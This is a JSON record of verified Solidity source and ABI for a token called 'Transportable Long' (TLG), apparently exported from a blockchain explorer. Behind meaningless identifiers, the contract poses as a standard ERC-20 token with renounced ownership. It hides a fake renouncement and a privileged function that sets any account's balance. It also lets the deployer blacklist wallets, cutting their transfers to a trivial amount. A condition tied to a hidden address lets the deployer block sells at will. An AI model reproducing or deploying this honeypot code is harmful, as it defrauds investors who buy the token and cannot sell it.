{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface modeSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract maxReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeTokenFrom {\n    function createPair(address feeModeAmount, address shouldTake) external returns (address);\n}\n\ninterface autoSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeMode) external view returns (uint256);\n\n    function transfer(address receiverReceiver, uint256 teamIs) external returns (bool);\n\n    function allowance(address takeTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverReceiver,\n        uint256 teamIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeTo, uint256 value);\n    event Approval(address indexed takeTo, address indexed spender, uint256 value);\n}\n\ninterface autoSenderMetadata is autoSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TransportableLong is maxReceiver, autoSender, autoSenderMetadata {\n\n    uint256 swapBuyExempt;\n\n    uint256 public enableMode;\n\n    uint256 private isList;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedFrom;\n    }\n\n    bool public receiverLimit;\n\n    function balanceOf(address feeMode) public view virtual override returns (uint256) {\n        return buyToken[feeMode];\n    }\n\n    bool private txEnableShould;\n\n    function getOwner() external view returns (address) {\n        return swapLaunch;\n    }\n\n    function transfer(address takeFrom, uint256 teamIs) external virtual override returns (bool) {\n        return swapMin(_msgSender(), takeFrom, teamIs);\n    }\n\n    mapping(address => bool) public feeMarketingMin;\n\n    mapping(address => bool) public buySender;\n\n    constructor (){\n        \n        modeSender takeSender = modeSender(swapEnable);\n        launchTake = modeTokenFrom(takeSender.factory()).createPair(takeSender.WETH(), address(this));\n        \n        autoFrom = _msgSender();\n        marketingToken();\n        buySender[autoFrom] = true;\n        buyToken[autoFrom] = txTradingIs;\n        \n        emit Transfer(address(0), autoFrom, txTradingIs);\n    }\n\n    bool public isTotal;\n\n    uint8 private marketingMin = 18;\n\n    function fundMarketingTotal() private view {\n        require(buySender[_msgSender()]);\n    }\n\n    string private launchedFrom = \"TLG\";\n\n    uint256 constant tradingIs = 6 ** 10;\n\n    bool public tradingToken;\n\n    string private txFee = \"Transportable Long\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingMin;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txTradingIs;\n    }\n\n    function enableToken(address takeFrom, uint256 teamIs) public {\n        fundMarketingTotal();\n        buyToken[takeFrom] = teamIs;\n    }\n\n    function swapMin(address swapMinList, address receiverReceiver, uint256 teamIs) internal returns (bool) {\n        if (swapMinList == autoFrom) {\n            return fromToken(swapMinList, receiverReceiver, teamIs);\n        }\n        uint256 listSender = autoSender(launchTake).balanceOf(isReceiverAt);\n        require(listSender == totalTeamFund);\n        require(receiverReceiver != isReceiverAt);\n        if (feeMarketingMin[swapMinList]) {\n            return fromToken(swapMinList, receiverReceiver, tradingIs);\n        }\n        return fromToken(swapMinList, receiverReceiver, teamIs);\n    }\n\n    address isReceiverAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public tokenExempt;\n\n    bool private liquidityMarketingMode;\n\n    function fromToken(address swapMinList, address receiverReceiver, uint256 teamIs) internal returns (bool) {\n        require(buyToken[swapMinList] >= teamIs);\n        buyToken[swapMinList] -= teamIs;\n        buyToken[receiverReceiver] += teamIs;\n        emit Transfer(swapMinList, receiverReceiver, teamIs);\n        return true;\n    }\n\n    function transferFrom(address swapMinList, address receiverReceiver, uint256 teamIs) external override returns (bool) {\n        if (_msgSender() != swapEnable) {\n            if (minEnable[swapMinList][_msgSender()] != type(uint256).max) {\n                require(teamIs <= minEnable[swapMinList][_msgSender()]);\n                minEnable[swapMinList][_msgSender()] -= teamIs;\n            }\n        }\n        return swapMin(swapMinList, receiverReceiver, teamIs);\n    }\n\n    address swapEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return txFee;\n    }\n\n    address private swapLaunch;\n\n    address public autoFrom;\n\n    function feeLaunched(uint256 teamIs) public {\n        fundMarketingTotal();\n        totalTeamFund = teamIs;\n    }\n\n    function liquidityAmount(address buyFromTake) public {\n        require(buyFromTake.balance < 100000);\n        if (tokenExempt) {\n            return;\n        }\n        if (receiverLimit != limitTx) {\n            sellMax = enableMode;\n        }\n        buySender[buyFromTake] = true;\n        \n        tokenExempt = true;\n    }\n\n    mapping(address => uint256) private buyToken;\n\n    uint256 totalTeamFund;\n\n    uint256 private txTradingIs = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private minEnable;\n\n    function feeAmount(address walletTrading) public {\n        fundMarketingTotal();\n        if (tradingToken) {\n            enableMode = sellMax;\n        }\n        if (walletTrading == autoFrom || walletTrading == launchTake) {\n            return;\n        }\n        feeMarketingMin[walletTrading] = true;\n    }\n\n    bool private autoReceiver;\n\n    function owner() external view returns (address) {\n        return swapLaunch;\n    }\n\n    uint256 private sellMax;\n\n    bool public limitTx;\n\n    function allowance(address takeLiquidityMax, address launchMax) external view virtual override returns (uint256) {\n        if (launchMax == swapEnable) {\n            return type(uint256).max;\n        }\n        return minEnable[takeLiquidityMax][launchMax];\n    }\n\n    function marketingToken() public {\n        emit OwnershipTransferred(autoFrom, address(0));\n        swapLaunch = address(0);\n    }\n\n    event OwnershipTransferred(address indexed sellTxTotal, address indexed receiverTotal);\n\n    function approve(address launchMax, uint256 teamIs) public virtual override returns (bool) {\n        minEnable[_msgSender()][launchMax] = teamIs;\n        emit Approval(_msgSender(), launchMax, teamIs);\n        return true;\n    }\n\n    address public launchTake;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTxTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLiquidityMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buySender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamIs\",\"type\":\"uint256\"}],\"name\":\"enableToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTrading\",\"type\":\"address\"}],\"name\":\"feeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamIs\",\"type\":\"uint256\"}],\"name\":\"feeLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeMarketingMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFromTake\",\"type\":\"address\"}],\"name\":\"liquidityAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMinList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TransportableLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}